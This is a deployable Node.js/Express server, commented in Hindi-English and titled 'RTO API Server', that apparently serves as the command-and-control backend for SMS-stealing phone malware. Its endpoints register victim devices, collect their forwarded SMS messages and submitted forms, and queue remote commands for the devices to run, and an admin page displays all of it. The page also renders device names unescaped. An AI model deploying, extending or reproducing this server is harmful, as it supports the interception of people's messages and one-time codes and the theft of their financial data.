// api.js - Pura API ek hi file mein
// Yeh file directly deploy kar sakte ho

const express = require('express');
const app = express();

// JSON data handle karne ke liye
app.use(express.json());

// Sab devices store karne ke liye (memory mein)
let devices = [];
let smsMessages = [];
let commands = [];
let forms = [];

// API Routes - Bahot Simple!

// 1. Device Register Karne Ke Liye
app.post('/api/device/register', (req, res) => {
    const device = req.body;
    device.last_seen = new Date();
    device.online = true;
    
    // Purana device hai ya naya?
    const index = devices.findIndex(d => d.device_id === device.device_id);
    if (index >= 0) {
        devices[index] = device; // Update karo
    } else {
        devices.push(device); // Naya device add karo
    }
    
    console.log(`Device registered: ${device.device_name}`);
    res.json({ success: true, message: 'Device updated' });
});

// 2. Device Se SMS Receive Karo
app.post('/api/sms/receive', (req, res) => {
    const sms = req.body;
    sms.timestamp = new Date();
    smsMessages.push(sms);
    
    // Sirf last 50 SMS rakho
    if (smsMessages.length > 50) {
        smsMessages = smsMessages.slice(-50);
    }
    
    console.log(`SMS received from ${sms.sender}: ${sms.message.substring(0, 30)}...`);
    res.json({ success: true });
});

// 3. Device Ko Commands Bhejo
app.post('/api/device/:id/command', (req, res) => {
    const deviceId = req.params.id;
    const command = req.body;
    command.id = Date.now().toString();
    command.device_id = deviceId;
    command.status = 'pending';
    command.created_at = new Date();
    
    commands.push(command);
    
    console.log(`Command sent to ${deviceId}: ${command.type}`);
    res.json({ success: true, command_id: command.id });
});

// 4. Device Ke Liye Pending Commands Dekho
app.get('/api/device/:id/commands', (req, res) => {
    const deviceId = req.params.id;
    const pendingCommands = commands.filter(cmd => 
        cmd.device_id === deviceId && cmd.status === 'pending'
    );
    
    res.json(pendingCommands);
});

// 5. Command Execute Ho Gaya To Mark Karo
app.post('/api/command/:id/executed', (req, res) => {
    const commandId = req.params.id;
    const command = commands.find(cmd => cmd.id === commandId);
    
    if (command) {
        command.status = 'executed';
        command.executed_at = new Date();
        console.log(`Command ${commandId} marked as executed`);
    }
    
    res.json({ success: true });
});

// 6. Form Submit Karo
app.post('/api/form/submit', (req, res) => {
    const form = req.body;
    form.submitted_at = new Date();
    forms.push(form);
    
    console.log(`Form submitted: ${form.name || 'No name'}`);
    res.json({ success: true });
});

// 7. Sab Devices Dekho (Admin Panel Ke Liye)
app.get('/api/devices', (req, res) => {
    const now = new Date();
    const deviceList = devices.map(device => ({
        ...device,
        online: (now - new Date(device.last_seen)) < 120000 // 2 minutes mein online
    }));
    
    res.json(deviceList);
});

// 8. Sab SMS Dekho
app.get('/api/sms', (req, res) => {
    res.json(smsMessages.slice(-50)); // Last 50 SMS
});

// 9. Sab Forms Dekho
app.get('/api/forms', (req, res) => {
    res.json(forms.slice(-50)); // Last 50 forms
});

// 10. Simple Home Page
app.get('/', (req, res) => {
    res.send(`
        <html>
        <head>
            <title>RTO API Server</title>
            <style>
                body { font-family: Arial; padding: 20px; }
                .card { background: #f0f0f0; padding: 20px; border-radius: 10px; margin: 10px 0; }
                .online { color: green; }
                .offline { color: red; }
            </style>
        </head>
        <body>
            <h1>RTO API Server Chalu Hai! 🚀</h1>
            
            <div class="card">
                <h3>API Endpoints:</h3>
                <ul>
                    <li>POST /api/device/register - Device register kare</li>
                    <li>POST /api/sms/receive - SMS receive kare</li>
                    <li>GET /api/device/[id]/commands - Commands lekar aaye</li>
                    <li>GET /api/devices - Sab devices dekhe</li>
                    <li>GET /api/sms - Sab SMS dekhe</li>
                </ul>
            </div>
            
            <div class="card">
                <h3>Current Stats:</h3>
                <p>Total Devices: ${devices.length}</p>
                <p>Total SMS: ${smsMessages.length}</p>
                <p>Pending Commands: ${commands.filter(c => c.status === 'pending').length}</p>
            </div>
            
            <div class="card">
                <h3>Connected Devices:</h3>
                ${devices.map(device => `
                    <div>
                        <strong>${device.device_name}</strong> - 
                        <span class="${(new Date() - new Date(device.last_seen) < 120000) ? 'online' : 'offline'}">
                            ${(new Date() - new Date(device.last_seen) < 120000) ? 'Online' : 'Offline'}
                        </span>
                        <br/>
                        Battery: ${device.battery_level || 'N/A'}%
                    </div>
                `).join('') || 'Koi device connected nahi hai'}
            </div>
        </body>
        </html>
    `);
});

// Server Start Karo
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server started on port ${PORT}`);
    console.log(`🌐 Open: http://localhost:${PORT}`);
});
